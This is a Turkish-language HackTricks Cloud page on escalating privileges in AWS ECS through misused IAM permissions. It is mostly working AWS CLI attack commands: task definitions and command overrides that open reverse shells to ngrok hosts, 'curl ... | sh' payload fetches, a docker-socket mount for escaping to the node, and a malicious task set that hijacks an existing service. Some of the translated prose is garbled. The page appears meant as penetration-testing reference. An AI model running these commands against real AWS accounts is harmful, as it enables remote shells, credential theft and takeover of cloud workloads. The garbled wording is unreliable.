# AWS - ECS Yetki Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## ECS

Daha fazla **ECS hakkında bilgi** için:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Bir saldırgan, ECS'de `iam:PassRole`, `ecs:RegisterTaskDefinition` ve `ecs:RunTask` izinlerini kötüye kullanarak **kötü niyetli bir konteyner** içeren yeni bir görev tanımı oluşturabilir ve bu görevi çalıştırarak kimlik doğrulama bilgilerini çalan bir **metadata** çalıştırabilir.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potansiyel Etki:** Farklı bir ECS rolüne doğrudan ayrıcalık yükseltilmesi.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Önceki örnekte olduğu gibi, bir saldırgan ECS'deki **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** izinlerini kötüye kullanarak **zararlı bir konteyner** içeren yeni bir görev tanımı oluşturabilir ve bu görevi **çalıştırabilir**.\
Ancak bu durumda, kötü niyetli görev tanımını çalıştırmak için bir konteyner örneğine ihtiyaç vardır.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potansiyel Etki:** Herhangi bir ECS rolüne doğrudan ayrıcalık yükseltilmesi.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

Önceki örnekte olduğu gibi, bir saldırgan ECS'de **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** veya **`ecs:CreateService`** izinlerini kötüye kullanarak **kredi kartı bilgilerini çalan kötü amaçlı bir konteyner** içeren yeni bir görev tanımı oluşturabilir ve **en az 1 görev çalıştıran yeni bir hizmet oluşturarak çalıştırabilir.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potansiyel Etki:** Herhangi bir ECS rolüne doğrudan ayrıcalık yükseltme.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Aslında, sadece bu izinlerle, geçersiz kılmalara izin vererek, şöyle bir şey yapmak mümkündür: bir konteynerde herhangi bir rolle keyfi komutlar yürütmek.

{% code overflow="wrap" %}
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
{% endcode %}

**Potansiyel Etki:** Herhangi bir ECS rolüne doğrudan ayrıcalık yükseltilmesi.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Bu senaryo öncekiler gibi **`iam:PassRole`** izni olmadan gerçekleşir.\
Bu hala ilginç çünkü keyfi bir konteyner çalıştırabilirseniz, rol olmadan bile olsa, bir ayrıcalıklı konteyner çalıştırabilir ve düğümden kaçabilir, EC2 IAM rolünü ve düğümde çalışan diğer ECS konteyner rollerini **çalabilirsiniz**.\
Hatta başka görevleri zorlayarak, onların kimlik bilgilerini çalmak için EC2 örneğine içeride çalışmalarını sağlayabilirsiniz (tartışıldığı gibi [**Düğüme ayrıcalık yükseltme bölümünde**](aws-ecs-privesc.md#privesc-to-node)).

{% hint style="warning" %}
Bu saldırı yalnızca **ECS kümesi EC2** örneklerini kullanıyorsa mümkündür ve Fargate değilse.
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

**`ecs:ExecuteCommand`, `ecs:DescribeTasks`** izni olan bir saldırgan, çalışan bir konteyner içinde komutlar çalıştırabilir ve ona bağlı IAM rolünü dışa aktarabilir (aws ecs execute-command komutunu çalıştırmak için açıklama izinlerine ihtiyacınız vardır).\
Ancak bunu yapabilmek için, konteyner örneğinin varsayılan olarak çalıştırılmayan **ExecuteCommand ajanını** çalıştırıyor olması gerekir.

Bu nedenle, saldırgan şunları deneyebilir:

* Her çalışan konteynerde bir komut çalıştırmaya çalışmak
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* Eğer **`ecs:RunTask`** yetkisi varsa, `aws ecs run-task --enable-execute-command [...]` komutu ile bir görev çalıştırın.
* Eğer **`ecs:StartTask`** yetkisi varsa, `aws ecs start-task --enable-execute-command [...]` komutu ile bir görev çalıştırın.
* Eğer **`ecs:CreateService`** yetkisi varsa, `aws ecs create-service --enable-execute-command [...]` komutu ile bir hizmet oluşturun.
* Eğer **`ecs:UpdateService`** yetkisi varsa, `aws ecs update-service --enable-execute-command [...]` komutu ile bir hizmeti güncelleyin.

Bu seçeneklerin örneklerini **önceki ECS ayrıcalık yükseltme bölümlerinde** bulabilirsiniz.

**Potansiyel Etki:** Konteynerlere bağlı farklı bir role ayrıcalık yükseltme.

### `ssm:StartSession`

Bu izni **ECS'ye ayrıcalık yükseltmek için** nasıl kötüye kullanabileceğinizi **ssm ayrıcalık yükseltme sayfasında** kontrol edin:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

Bu izinleri **ECS'ye ayrıcalık yükseltmek için** nasıl kötüye kullanabileceğinizi **ec2 ayrıcalık yükseltme sayfasında** kontrol edin:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: Farklı bir AWS hesabından bir örnek kaydederek saldırganın kontrol ettiği makinelerde görevlerin çalıştırılmasına olanak sağlamak mümkün müdür??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
TODO: Bunu test edin
{% endhint %}

`ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet` ve `ecs:DescribeTaskSets` izinlerine sahip bir saldırgan, **mevcut bir ECS hizmeti için kötü niyetli bir görev kümesi oluşturabilir ve ana görev kümesini güncelleyebilir**. Bu, saldırganın **hizmet içinde keyfi kod yürütmesine izin verir**.
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Potansiyel Etki**: Etkilenen serviste keyfi kodları yürüterek, işlevselliğini etkileyebilir veya hassas verileri dışarıya çıkarabilir.

## Referanslar

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
